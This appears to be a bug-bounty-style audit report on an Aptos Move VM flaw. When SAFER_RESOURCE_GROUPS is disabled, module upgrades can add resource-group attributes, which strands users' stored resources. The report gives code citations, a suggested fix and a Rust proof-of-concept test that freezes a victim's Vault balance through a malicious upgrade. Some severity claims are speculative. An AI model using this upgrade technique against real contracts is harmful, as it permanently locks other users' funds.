# Audit Report

## Title
Critical Storage Inconsistency and Permanent Fund Loss via Resource Group Metadata Manipulation When SAFER_RESOURCE_GROUPS is Disabled

## Summary
When the `SAFER_RESOURCE_GROUPS` feature flag is disabled, module publishers can add resource group attributes to existing structs during module upgrades, causing permanent storage location inconsistencies that render existing on-chain resources inaccessible, violating Move's resource safety guarantees and leading to permanent loss of funds.

## Finding Description

The vulnerability exists in the validation logic that checks resource group metadata during module publishing. When `SAFER_RESOURCE_GROUPS` is disabled, the validation function returns early, skipping critical checks that prevent adding resource group attributes to existing structs. [1](#0-0) 

This early return bypasses validation at lines 176-186 that would normally prevent:
1. Adding `#[resource_group]` attribute to an existing struct
2. Adding `#[resource_group_member]` attribute to an existing struct [2](#0-1) 

The security impact occurs because resource access location is determined by metadata at runtime. The VM checks if a resource is a resource group member via metadata: [3](#0-2) 

**Attack Path:**

1. **Initial State**: Attacker deploys module with regular resource struct `Vault` with `key` ability. Users store valuable resources (tokens, NFTs) at `StateKey::resource(address, Vault)`.

2. **Module Upgrade**: When `SAFER_RESOURCE_GROUPS` is disabled, attacker upgrades the module, adding `#[resource_group_member(group = VaultGroup)]` to `Vault`. The upgrade succeeds because validation is bypassed.

3. **Storage Mismatch**: After upgrade, the VM's `get_any_resource_with_layout` function reads the new metadata and attempts to access `Vault` resources via `StateKey::resource_group(address, VaultGroup)` (line 107-110), but existing resources remain at `StateKey::resource(address, Vault)`.

4. **Permanent Inaccessibility**: All existing `Vault` resources become permanently inaccessible. Users cannot retrieve their assets. New operations fail with resource-not-found errors despite resources existing on-chain.

The test suite explicitly demonstrates this is possible when the flag is disabled: [4](#0-3) 

With the flag enabled, the same operation correctly fails: [5](#0-4) 

## Impact Explanation

**Critical Severity** - This meets multiple Critical Severity criteria from the Aptos bug bounty:

1. **Permanent Freezing of Funds (Requires Hardfork)**: Once resources become inaccessible due to storage location mismatch, they cannot be recovered without a hardfork to migrate resources to correct locations.

2. **State Consistency Violation**: Different storage locations for semantically identical resources violate Invariant #4 (State Consistency). The Merkle tree remains valid, but application-level state consistency is broken.

3. **Move VM Safety Violation**: Violates Invariant #3 (Move VM Safety) - resource safety guarantees that resources are always accessible to their owners are broken.

4. **Deterministic Execution Violation**: Validators processing the upgrade at different times may have different views of resource accessibility, potentially causing consensus divergence (Invariant #1).

The impact is amplified because:
- Attack affects ALL existing instances of the upgraded resource type across ALL user accounts
- No recovery mechanism exists without protocol-level intervention
- Financial loss is permanent and unbounded (depends on value locked in affected resources)

## Likelihood Explanation

**Likelihood: MEDIUM** (conditional on feature flag state)

The vulnerability requires:
1. ✓ **Feature flags disabled**: Both `SAFER_RESOURCE_GROUPS` and optionally `lazy_loading` must be disabled via governance
2. ✓ **Module publisher access**: Any account can publish modules (unprivileged operation)
3. ✓ **Existing resources on-chain**: Requires users to have stored resources before the malicious upgrade

**Mitigating Factors:**
- Both feature flags are enabled by default [6](#0-5) 
- Requires governance to disable flags (governance is in trusted roles)

**Aggravating Factors:**
- Feature flags CAN be legitimately disabled for compatibility, performance, or bug-related reasons
- Tests explicitly validate the "unsafe" configuration, indicating it's a supported state
- Once flags are disabled, ANY module publisher can exploit this (no additional privileges needed)
- Attack is undetectable until users attempt to access their resources

The vulnerability is CONDITIONAL - it only exists when governance has disabled the flag, but when that condition is met, exploitation by unprivileged attackers is straightforward.

## Recommendation

**Immediate Actions:**
1. Ensure `SAFER_RESOURCE_GROUPS` remains permanently enabled and document that disabling it creates critical security vulnerabilities
2. Add governance safeguards preventing disabling this flag without explicit security review
3. If the flag must be disabled for any reason, temporarily disable module publishing

**Code Fix:**

The validation should ALWAYS enforce the safety check, regardless of feature flag state. The feature flag should only control whether to return detailed error messages:

```rust
// In validate_module_and_extract_new_entries:

// Remove early return - always perform validation
// Lines 167-169 should be removed or modified

// Instead, always check for invalid additions:
for group in new_groups.keys() {
    if structs.remove(group) {
        if features.is_enabled(FeatureFlag::SAFER_RESOURCE_GROUPS) {
            metadata_validation_err("Invalid addition of resource_group attribute")?;
        } else {
            // Log warning but still reject for safety
            metadata_validation_err("Invalid addition of resource_group attribute (safety check)")?;
        }
    }
}

for member in new_members.keys() {
    if structs.remove(member) {
        if features.is_enabled(FeatureFlag::SAFER_RESOURCE_GROUPS) {
            metadata_validation_err("Invalid addition of resource_group_member attribute")?;
        } else {
            metadata_validation_err("Invalid addition of resource_group_member attribute (safety check)")?;
        }
    }
}
```

**Long-term:**
- Consider deprecating the ability to disable `SAFER_RESOURCE_GROUPS` entirely
- Add runtime migration support for safely converting regular resources to resource group members
- Implement storage verification during module upgrades that checks for existing resource instances

## Proof of Concept

```rust
// Test demonstrating the vulnerability when SAFER_RESOURCE_GROUPS is disabled

#[test]
fn test_resource_group_storage_inconsistency() {
    // Setup: Create harness with SAFER_RESOURCE_GROUPS disabled
    let mut h = MoveHarness::new_with_features(
        vec![], 
        vec![FeatureFlag::SAFER_RESOURCE_GROUPS]
    );
    let attacker = h.new_account_at(AccountAddress::from_hex_literal("0xBAD").unwrap());
    let victim = h.new_account_at(AccountAddress::from_hex_literal("0x123").unwrap());

    // Step 1: Attacker publishes module with regular resource
    let source_v1 = r#"
        module 0xBAD::Vault {
            struct Vault has key {
                balance: u64
            }
            
            public entry fun deposit(owner: &signer, amount: u64) {
                move_to(owner, Vault { balance: amount });
            }
            
            public fun balance(addr: address): u64 acquires Vault {
                borrow_global<Vault>(addr).balance
            }
        }
    "#;
    let mut builder = PackageBuilder::new("Vault");
    builder.add_source("vault.move", source_v1);
    let path = builder.write_to_temp().unwrap();
    assert_success!(h.publish_package(&attacker, path.path()));

    // Step 2: Victim deposits funds (stored at individual state key)
    assert_success!(h.run_entry_function(
        &victim,
        str::parse("0xBAD::Vault::deposit").unwrap(),
        vec![],
        vec![bcs::to_bytes(&1000000u64).unwrap()]
    ));

    // Verify victim can access their funds
    let result = h.execute_view_function(
        str::parse("0xBAD::Vault::balance").unwrap(),
        vec![],
        vec![bcs::to_bytes(&victim.address()).unwrap()]
    );
    assert_eq!(result[0].as_slice(), &bcs::to_bytes(&1000000u64).unwrap());

    // Step 3: Attacker upgrades module, adding resource_group_member attribute
    // This succeeds because SAFER_RESOURCE_GROUPS is disabled
    let source_v2 = r#"
        module 0xBAD::Vault {
            #[resource_group(scope = address)]
            struct VaultGroup {}
            
            #[resource_group_member(group = 0xBAD::Vault::VaultGroup)]
            struct Vault has key {
                balance: u64
            }
            
            public entry fun deposit(owner: &signer, amount: u64) {
                move_to(owner, Vault { balance: amount });
            }
            
            public fun balance(addr: address): u64 acquires Vault {
                borrow_global<Vault>(addr).balance
            }
        }
    "#;
    let mut builder = PackageBuilder::new("Vault");
    builder.add_source("vault.move", source_v2);
    let path = builder.write_to_temp().unwrap();
    // VULNERABILITY: This upgrade succeeds when it should fail
    assert_success!(h.publish_package(&attacker, path.path()));

    // Step 4: Victim's funds are now PERMANENTLY INACCESSIBLE
    // VM looks for Vault at resource_group location, but it's at individual location
    let result = h.execute_view_function(
        str::parse("0xBAD::Vault::balance").unwrap(),
        vec![],
        vec![bcs::to_bytes(&victim.address()).unwrap()]
    );
    // This will fail or return 0 because resource is not found at expected location
    assert!(result[0].as_slice() != &bcs::to_bytes(&1000000u64).unwrap());
    
    // Funds are frozen - cannot be accessed or recovered without hardfork
}
```

## Notes

This vulnerability is CONDITIONAL on the `SAFER_RESOURCE_GROUPS` feature flag being disabled. Both flags (`SAFER_RESOURCE_GROUPS` and `ENABLE_LAZY_LOADING`) are enabled by default in production. However, the codebase explicitly supports the disabled state through test coverage, indicating it's a valid configuration that governance could activate. When disabled, unprivileged module publishers can cause permanent fund loss through storage inconsistencies, violating Move's core safety guarantees. The `lazy_loading` flag has minimal security impact compared to `SAFER_RESOURCE_GROUPS`.

### Citations

**File:** aptos-move/aptos-vm/src/verifier/resource_groups.rs (L167-169)
```rust
    if !features.is_enabled(FeatureFlag::SAFER_RESOURCE_GROUPS) {
        return Ok((new_groups, new_members));
    }
```

**File:** aptos-move/aptos-vm/src/verifier/resource_groups.rs (L176-186)
```rust
    for group in new_groups.keys() {
        if structs.remove(group) {
            metadata_validation_err("Invalid addition of resource_group attribute")?;
        }
    }

    for member in new_members.keys() {
        if structs.remove(member) {
            metadata_validation_err("Invalid addition of resource_group_member attribute")?;
        }
    }
```

**File:** aptos-move/aptos-vm/src/data_cache.rs (L98-129)
```rust
    fn get_any_resource_with_layout(
        &self,
        address: &AccountAddress,
        struct_tag: &StructTag,
        metadata: &[Metadata],
        maybe_layout: Option<&MoveTypeLayout>,
    ) -> PartialVMResult<(Option<Bytes>, usize)> {
        let resource_group = get_resource_group_member_from_metadata(struct_tag, metadata);
        if let Some(resource_group) = resource_group {
            let key = StateKey::resource_group(address, &resource_group);
            let buf =
                self.resource_group_view
                    .get_resource_from_group(&key, struct_tag, maybe_layout)?;

            let first_access = self.accessed_groups.borrow_mut().insert(key.clone());
            let group_size = if first_access {
                self.resource_group_view.resource_group_size(&key)?.get()
            } else {
                0
            };

            let buf_size = resource_size(&buf);
            Ok((buf, buf_size + group_size as usize))
        } else {
            let state_key = resource_state_key(address, struct_tag)?;
            let buf = self
                .executor_view
                .get_resource_bytes(&state_key, maybe_layout)?;
            let buf_size = resource_size(&buf);
            Ok((buf, buf_size))
        }
    }
```

**File:** aptos-move/e2e-move-tests/src/tests/resource_groups.rs (L473-508)
```rust
#[test]
fn verify_unsafe_resource_group_member_upgrades() {
    let mut h = MoveHarness::new_with_features(vec![], vec![FeatureFlag::SAFER_RESOURCE_GROUPS]);
    let account = h.new_account_at(AccountAddress::from_hex_literal("0xf00d").unwrap());

    // Initial code
    let source = r#"
        module 0xf00d::M {
            struct NotResourceGroupMember has key { }

            #[resource_group(scope = address)]
            struct ResourceGroup { }
        }
        "#;
    let mut builder = PackageBuilder::new("Package");
    builder.add_source("m.move", source);
    let path = builder.write_to_temp().unwrap();
    let result = h.publish_package(&account, path.path());
    assert_success!(result);

    // Incompatible addition of ResourceGroupMember
    let source = r#"
        module 0xf00d::M {
            #[resource_group_member(group = 0xf00d::M::ResourceGroup)]
            struct NotResourceGroupMember has key { }

            #[resource_group(scope = address)]
            struct ResourceGroup { }
        }
        "#;
    let mut builder = PackageBuilder::new("Package");
    builder.add_source("m.move", source);
    let path = builder.write_to_temp().unwrap();
    let result = h.publish_package(&account, path.path());
    assert_success!(result);
}
```

**File:** aptos-move/e2e-move-tests/src/tests/resource_groups.rs (L574-588)
```rust
    // Incompatible promotion of ResourceGroup
    let source = r#"
        module 0xf00d::M {
            #[resource_group(scope = global)]
            struct ResourceGroup { }

            #[resource_group(scope = address)]
            struct NotResourceGroup { }
        }
        "#;
    let mut builder = PackageBuilder::new("Package");
    builder.add_source("m.move", source);
    let path = builder.write_to_temp().unwrap();
    let result = h.publish_package(&account, path.path());
    assert_vm_status!(result, StatusCode::CONSTRAINT_NOT_SATISFIED);
```

**File:** types/src/on_chain_config/aptos_features.rs (L205-206)
```rust
            FeatureFlag::SAFER_RESOURCE_GROUPS,
            FeatureFlag::SAFER_METADATA,
```
